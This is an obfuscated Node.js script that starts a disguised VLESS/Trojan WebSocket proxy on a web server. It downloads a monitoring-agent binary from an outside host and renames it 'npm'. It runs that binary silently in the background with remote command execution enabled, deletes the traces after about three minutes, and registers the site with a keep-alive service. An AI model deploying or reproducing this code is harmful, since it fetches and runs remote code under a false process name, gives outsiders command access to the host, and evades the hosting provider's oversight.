const _0x1a0c=['pipe','&path=%2F','data','error','post','write','slice','WSPATH','&fp=chrome&type=ws&host=','net','substr','unlink','child_process','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createServer','digest','UUID','chmod\x20+x\x20npm','close','url','DOMAIN','2087','https://','map','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','true','NEZHA_PORT','crypto','split','stream','vless://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','find','utf-8','log','text/html','replace','buffer','text/plain','base64','axios','readUInt8','writeFileSync','toString','hex','Not\x20Found\x0a','readFile','send','readUInt16BE','8.8.4.4','arch','env','then','every','catch','SUB_PATH','Unknown','join','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Answer','application/json','false','writeHead','utf8','https://oooo.serv00.net/add-url','message','end','config.yaml','NEZHA_SERVER','listen','2053','\x20-p\x20','get','trojan://','once','npm\x20download\x20successfully','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','includes','createWriteStream','Status','a85fafb4-5b9e-46a2-90c2-beea0a6dc100','connect','length','update','concat'];const _0x5c43=function(_0x1a0cc0,_0x5c439a){_0x1a0cc0=_0x1a0cc0-0x0;let _0x3c50d5=_0x1a0c[_0x1a0cc0];return _0x3c50d5;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x5c43('0x29'));const net=require(_0x5c43('0x9'));const path=require('path');const crypto=require(_0x5c43('0x1b'));const {Buffer}=require(_0x5c43('0x26'));const {exec,execSync}=require(_0x5c43('0xc'));const {WebSocket,createWebSocketStream}=require('ws');const UUID=process[_0x5c43('0x34')][_0x5c43('0x10')]||_0x5c43('0x51');const NEZHA_SERVER=process[_0x5c43('0x34')][_0x5c43('0x45')]||'';const NEZHA_PORT=process[_0x5c43('0x34')][_0x5c43('0x1a')]||'';const NEZHA_KEY=process[_0x5c43('0x34')]['NEZHA_KEY']||'';const DOMAIN=process[_0x5c43('0x34')][_0x5c43('0x14')]||'1234.abc.com';const AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![];const WSPATH=process['env'][_0x5c43('0x7')]||UUID['slice'](0x0,0x8);const SUB_PATH=process[_0x5c43('0x34')][_0x5c43('0x38')]||'sub';const NAME=process[_0x5c43('0x34')]['NAME']||'';const PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0xd0f54f=await axios[_0x5c43('0x49')]('https://api.ip.sb/geoip');const _0xa607bb=_0xd0f54f[_0x5c43('0x2')];ISP=(_0xa607bb['country_code']+'-'+_0xa607bb['isp'])[_0x5c43('0x25')](/ /g,'_');}catch(_0x4caea2){ISP=_0x5c43('0x39');}};GetISP();const httpServer=http[_0x5c43('0xe')]((_0x3bae97,_0x55feb0)=>{if(_0x3bae97[_0x5c43('0x13')]==='/'){const _0x1ada0f=path['join'](__dirname,'index.html');fs[_0x5c43('0x2f')](_0x1ada0f,_0x5c43('0x40'),(_0x142c96,_0x364e09)=>{if(_0x142c96){_0x55feb0['writeHead'](0xc8,{'Content-Type':'text/html'});_0x55feb0[_0x5c43('0x43')]('Hello\x20world!');return;}_0x55feb0[_0x5c43('0x3f')](0xc8,{'Content-Type':_0x5c43('0x24')});_0x55feb0['end'](_0x364e09);});return;}else if(_0x3bae97['url']==='/'+SUB_PATH){const _0x15951f=NAME?NAME+'-'+ISP:ISP;const _0x50496a=_0x5c43('0x1e')+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x5c43('0x8')+DOMAIN+_0x5c43('0x1')+WSPATH+'#'+_0x15951f;const _0x39283d=_0x5c43('0x4a')+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x15951f;const _0x3a0ea7=_0x50496a+'\x0a'+_0x39283d;const _0x313dbf=Buffer['from'](_0x3a0ea7)[_0x5c43('0x2c')](_0x5c43('0x28'));_0x55feb0[_0x5c43('0x3f')](0xc8,{'Content-Type':_0x5c43('0x27')});_0x55feb0['end'](_0x313dbf+'\x0a');}else{_0x55feb0[_0x5c43('0x3f')](0x194,{'Content-Type':_0x5c43('0x27')});_0x55feb0[_0x5c43('0x43')](_0x5c43('0x2e'));}});const wss=new WebSocket['Server']({'server':httpServer});const uuid=UUID[_0x5c43('0x25')](/-/g,'');const DNS_SERVERS=[_0x5c43('0x32'),'1.1.1.1'];function resolveHost(_0x67decf){return new Promise((_0x187bd2,_0x5abab6)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x67decf)){_0x187bd2(_0x67decf);return;}let _0x330460=0x0;function _0x1f5895(){if(_0x330460>=DNS_SERVERS['length']){_0x5abab6(new Error('Failed\x20to\x20resolve\x20'+_0x67decf+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4da586=DNS_SERVERS[_0x330460];_0x330460++;const _0x1567ed='https://dns.google/resolve?name='+encodeURIComponent(_0x67decf)+'&type=A';axios[_0x5c43('0x49')](_0x1567ed,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x5c43('0x35')](_0x290bde=>{const _0x5b77e7=_0x290bde['data'];if(_0x5b77e7[_0x5c43('0x50')]===0x0&&_0x5b77e7[_0x5c43('0x3c')]&&_0x5b77e7['Answer'][_0x5c43('0x53')]>0x0){const _0x3f026f=_0x5b77e7['Answer'][_0x5c43('0x21')](_0x49e91a=>_0x49e91a['type']===0x1);if(_0x3f026f){_0x187bd2(_0x3f026f[_0x5c43('0x2')]);return;}}_0x1f5895();})['catch'](_0x53752c=>{_0x1f5895();});}_0x1f5895();});}function handleVlessConnection(_0x276dec,_0x467a84){const [_0x293cf3]=_0x467a84;const _0x5c106f=_0x467a84[_0x5c43('0x6')](0x1,0x11);if(!_0x5c106f['every']((_0x137b37,_0x110f12)=>_0x137b37==parseInt(uuid[_0x5c43('0xa')](_0x110f12*0x2,0x2),0x10)))return![];let _0x3ef538=_0x467a84[_0x5c43('0x6')](0x11,0x12)[_0x5c43('0x2a')]()+0x13;const _0x167bb1=_0x467a84['slice'](_0x3ef538,_0x3ef538+=0x2)['readUInt16BE'](0x0);const _0x24d69d=_0x467a84['slice'](_0x3ef538,_0x3ef538+=0x1)['readUInt8']();const _0x4c4077=_0x24d69d==0x1?_0x467a84['slice'](_0x3ef538,_0x3ef538+=0x4)['join']('.'):_0x24d69d==0x2?new TextDecoder()['decode'](_0x467a84['slice'](_0x3ef538+0x1,_0x3ef538+=0x1+_0x467a84['slice'](_0x3ef538,_0x3ef538+0x1)['readUInt8']())):_0x24d69d==0x3?_0x467a84['slice'](_0x3ef538,_0x3ef538+=0x10)['reduce']((_0x2ecba9,_0x4b125b,_0x1b0737,_0x425160)=>_0x1b0737%0x2?_0x2ecba9['concat'](_0x425160[_0x5c43('0x6')](_0x1b0737-0x1,_0x1b0737+0x1)):_0x2ecba9,[])[_0x5c43('0x17')](_0x56bd69=>_0x56bd69[_0x5c43('0x31')](0x0)[_0x5c43('0x2c')](0x10))['join'](':'):'';_0x276dec[_0x5c43('0x30')](new Uint8Array([_0x293cf3,0x0]));const _0x579ea8=createWebSocketStream(_0x276dec);resolveHost(_0x4c4077)[_0x5c43('0x35')](_0x497784=>{net['connect']({'host':_0x497784,'port':_0x167bb1},function(){this['write'](_0x467a84[_0x5c43('0x6')](_0x3ef538));_0x579ea8['on'](_0x5c43('0x3'),()=>{})[_0x5c43('0x0')](this)['on']('error',()=>{})[_0x5c43('0x0')](_0x579ea8);})['on']('error',()=>{});})['catch'](_0x91185e=>{net['connect']({'host':_0x4c4077,'port':_0x167bb1},function(){this['write'](_0x467a84['slice'](_0x3ef538));_0x579ea8['on']('error',()=>{})['pipe'](this)['on'](_0x5c43('0x3'),()=>{})[_0x5c43('0x0')](_0x579ea8);})['on'](_0x5c43('0x3'),()=>{});});return!![];}function handleTrojanConnection(_0x33747d,_0x507ea9){try{if(_0x507ea9[_0x5c43('0x53')]<0x3a)return![];const _0x1e04e7=_0x507ea9[_0x5c43('0x6')](0x0,0x38)['toString']();const _0x2ec16e=[UUID];let _0x19c039=null;for(const _0x2f8cb8 of _0x2ec16e){const _0x2a9142=crypto['createHash']('sha224')[_0x5c43('0x54')](_0x2f8cb8)[_0x5c43('0xf')](_0x5c43('0x2d'));if(_0x2a9142===_0x1e04e7){_0x19c039=_0x2f8cb8;break;}}if(!_0x19c039)return![];let _0x374f3b=0x38;if(_0x507ea9[_0x374f3b]===0xd&&_0x507ea9[_0x374f3b+0x1]===0xa){_0x374f3b+=0x2;}const _0x16c20a=_0x507ea9[_0x374f3b];if(_0x16c20a!==0x1)return![];_0x374f3b+=0x1;const _0x3a0467=_0x507ea9[_0x374f3b];_0x374f3b+=0x1;let _0xfd2514,_0x16907b;if(_0x3a0467===0x1){_0xfd2514=_0x507ea9['slice'](_0x374f3b,_0x374f3b+0x4)['join']('.');_0x374f3b+=0x4;}else if(_0x3a0467===0x3){const _0x3999f3=_0x507ea9[_0x374f3b];_0x374f3b+=0x1;_0xfd2514=_0x507ea9[_0x5c43('0x6')](_0x374f3b,_0x374f3b+_0x3999f3)[_0x5c43('0x2c')]();_0x374f3b+=_0x3999f3;}else if(_0x3a0467===0x4){_0xfd2514=_0x507ea9['slice'](_0x374f3b,_0x374f3b+0x10)['reduce']((_0x4c1c6e,_0x94f290,_0x17bde3,_0x97cd6)=>_0x17bde3%0x2?_0x4c1c6e[_0x5c43('0x55')](_0x97cd6['slice'](_0x17bde3-0x1,_0x17bde3+0x1)):_0x4c1c6e,[])['map'](_0x2ea565=>_0x2ea565['readUInt16BE'](0x0)[_0x5c43('0x2c')](0x10))[_0x5c43('0x3a')](':');_0x374f3b+=0x10;}else{return![];}_0x16907b=_0x507ea9[_0x5c43('0x31')](_0x374f3b);_0x374f3b+=0x2;if(_0x374f3b<_0x507ea9['length']&&_0x507ea9[_0x374f3b]===0xd&&_0x507ea9[_0x374f3b+0x1]===0xa){_0x374f3b+=0x2;}const _0x2906a7=createWebSocketStream(_0x33747d);resolveHost(_0xfd2514)[_0x5c43('0x35')](_0x222658=>{net['connect']({'host':_0x222658,'port':_0x16907b},function(){if(_0x374f3b<_0x507ea9['length']){this['write'](_0x507ea9[_0x5c43('0x6')](_0x374f3b));}_0x2906a7['on']('error',()=>{})[_0x5c43('0x0')](this)['on'](_0x5c43('0x3'),()=>{})['pipe'](_0x2906a7);})['on']('error',()=>{});})[_0x5c43('0x37')](_0x2c6287=>{net[_0x5c43('0x52')]({'host':_0xfd2514,'port':_0x16907b},function(){if(_0x374f3b<_0x507ea9[_0x5c43('0x53')]){this[_0x5c43('0x5')](_0x507ea9[_0x5c43('0x6')](_0x374f3b));}_0x2906a7['on'](_0x5c43('0x3'),()=>{})['pipe'](this)['on']('error',()=>{})[_0x5c43('0x0')](_0x2906a7);})['on'](_0x5c43('0x3'),()=>{});});return!![];}catch(_0x22dd62){return![];}}wss['on']('connection',(_0x3bd1f9,_0x31fa14)=>{const _0x8457ab=_0x31fa14['url']||'';_0x3bd1f9[_0x5c43('0x4b')](_0x5c43('0x42'),_0x118092=>{if(_0x118092['length']>0x11&&_0x118092[0x0]===0x0){const _0x2eef4d=_0x118092[_0x5c43('0x6')](0x1,0x11);const _0x5e4e5f=_0x2eef4d[_0x5c43('0x36')]((_0xf7dbb,_0x4f3296)=>_0xf7dbb==parseInt(uuid[_0x5c43('0xa')](_0x4f3296*0x2,0x2),0x10));if(_0x5e4e5f){if(!handleVlessConnection(_0x3bd1f9,_0x118092)){_0x3bd1f9[_0x5c43('0x12')]();}return;}}if(!handleTrojanConnection(_0x3bd1f9,_0x118092)){_0x3bd1f9[_0x5c43('0x12')]();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x16ad33=os[_0x5c43('0x33')]();if(_0x16ad33==='arm'||_0x16ad33==='arm64'||_0x16ad33==='aarch64'){if(!NEZHA_PORT){return'https://arm64.ssss.nyc.mn/v1';}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return'https://amd64.ssss.nyc.mn/v1';}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x313c18=getDownloadUrl();const _0x2cc455=await axios({'method':'get','url':_0x313c18,'responseType':_0x5c43('0x1d')});const _0xace496=fs[_0x5c43('0x4f')]('npm');_0x2cc455['data'][_0x5c43('0x0')](_0xace496);return new Promise((_0x366e46,_0x1cfef0)=>{_0xace496['on']('finish',()=>{console[_0x5c43('0x23')](_0x5c43('0x4c'));exec(_0x5c43('0x11'),_0x3ede27=>{if(_0x3ede27)_0x1cfef0(_0x3ede27);_0x366e46();});});_0xace496['on'](_0x5c43('0x3'),_0x1cfef0);});}catch(_0x147de6){throw _0x147de6;}};const runnz=async()=>{try{const _0x25504c=execSync(_0x5c43('0x3b'),{'encoding':_0x5c43('0x22')});if(_0x25504c['trim']()!==''){console[_0x5c43('0x23')]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x493fac){}await downloadFile();let _0x318285='';let _0x2cda01=['443','8443','2096',_0x5c43('0x15'),'2083',_0x5c43('0x47')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x28174d=_0x2cda01[_0x5c43('0x4e')](NEZHA_PORT)?'--tls':'';_0x318285='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c43('0x48')+NEZHA_KEY+'\x20'+_0x28174d+_0x5c43('0x18');}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x53ffba=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5c43('0x1c')](':')['pop']():'';const _0xad84be=_0x2cda01['includes'](_0x53ffba)?_0x5c43('0x19'):_0x5c43('0x3e');const _0x18cdca='client_secret:\x20'+NEZHA_KEY+_0x5c43('0x20')+NEZHA_SERVER+_0x5c43('0xd')+_0xad84be+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5c43('0x2b')](_0x5c43('0x44'),_0x18cdca);}_0x318285=_0x5c43('0x1f');}else{console[_0x5c43('0x23')](_0x5c43('0x4d'));return;}try{exec(_0x318285,{'shell':'/bin/bash'},_0x2f6038=>{if(_0x2f6038)console['error']('npm\x20running\x20error:',_0x2f6038);else console['log']('npm\x20is\x20running');});}catch(_0x196eda){console[_0x5c43('0x3')]('error:\x20'+_0x196eda);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x411bc2=_0x5c43('0x16')+DOMAIN;try{const _0x262a60=await axios[_0x5c43('0x4')](_0x5c43('0x41'),{'url':_0x411bc2},{'headers':{'Content-Type':_0x5c43('0x3d')}});console[_0x5c43('0x23')]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x47d328){}}const delFiles=()=>{fs['unlink']('npm',()=>{});fs[_0x5c43('0xb')](_0x5c43('0x44'),()=>{});};httpServer[_0x5c43('0x46')](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
